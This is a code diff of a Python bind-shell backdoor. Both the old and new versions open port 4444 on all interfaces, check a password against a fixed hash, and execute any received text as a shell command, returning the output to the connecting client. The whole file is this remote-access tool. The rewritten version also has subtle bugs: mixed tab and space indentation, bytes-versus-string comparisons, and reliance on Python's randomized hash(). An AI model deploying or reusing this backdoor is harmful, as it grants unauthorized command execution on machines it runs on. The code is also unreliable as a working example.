@@ -1,66 +1,76 @@
 import socket
+from socket import error as SocketError
 import subprocess
 
-LISTEN_IP = ''  # Bind to all interfaces
-LISTEN_PORT = 4444
-AUTH_HASH = 1634504265594755506  # hash of your password
+HOST = ''
+PORT = 4444
 
-def wait_for_client(sock):
-    print("[+] Listener active on port", LISTEN_PORT)
-    sock.settimeout(120)
-    sock.listen(1)
-    return sock.accept()
+server = socket.socket()
+server.bind((HOST, PORT))
 
-def authenticate(conn):
-    print("[*] Awaiting authentication...")
-    try:
-        received = conn.recv(1024)
-        if not received or hash(received) != AUTH_HASH:
-            print("[-] Authentication failed.")
-            return False
-        print("[+] Authentication success.")
-        return True
-    except Exception as error:
-        print("[!] Error during auth:", error)
-        return False
 
-def command_shell(conn):
-    print("[*] Shell session started.")
+def login():    
+    print('Server Started')
+    print('Listening for Client Connection...')
+    server.settimeout(120)
+    server.listen(1)
+    
+    global client, client_addr
+    client, client_addr = server.accept()
+    print('Connection established, login attempt')
     while True:
-        try:
-            cmd = conn.recv(1024).decode()
-            if cmd == 'exit':
-                break
+            try:                
+                password = client.recv(1024)
+                
+                if (len(password) == 0):
+                    print('Failed Login')
+                    client.close()
+                    return False
+                
+                password.decode()
+                print(password)
+                if hash(password) == 1634504265594755506:
+                        print('Login Success')
+                        return True
+                else:
+                    print('Failed Login')
+                    client.close()
+                    return False
+            except SocketError as se:
+                print('SocketError', se)                
+                server.listen(1)
+                client, client_addr = server.accept()
+            except Exception as e:
+                print('Exception', e)
 
-            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate()
-            result = stdout + stderr or b'no stdout'
-            conn.send(result)
-        except Exception as e:
-            print("[!] Command error:", e)
-            break
+login_status = False
+while not login_status:
+    login_status = login()
 
-def main():
-    listener = socket.socket()
-    listener.bind((LISTEN_IP, LISTEN_PORT))
+while True:
+    	try:
+            print('Awaiting Command')
+            command = client.recv(1024)
+            command.decode()
 
-    while True:
-        try:
-            client, addr = wait_for_client(listener)
-            print("[+] Connection from", addr)
+            if command == 'exit':
+                    continue
 
-            if not authenticate(client):
-                client.close()
-                continue
+            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            output = op.stdout.read()
+            output_error = op.stderr.read()
+            print('Sending Response')
 
-            command_shell(client)
-            client.close()
+            #print(output + output_error)
+            if output + output_error == '':
+                    client.send('no stdout')
+            else:
+                    client.send(output + output_error)
+    	except Exception as e:
+                print('Main Loop Exception', e)
+                login_status = False
+                while not login_status:
+                    login_status = login()
 
-        except Exception as e:
-            print("[!] Listener error:", e)
-
-    listener.close()
-    print("[x] Listener shutdown.")
-
-if __name__ == '__main__':
-    main()
+server.close()
+print('Connection Closed')
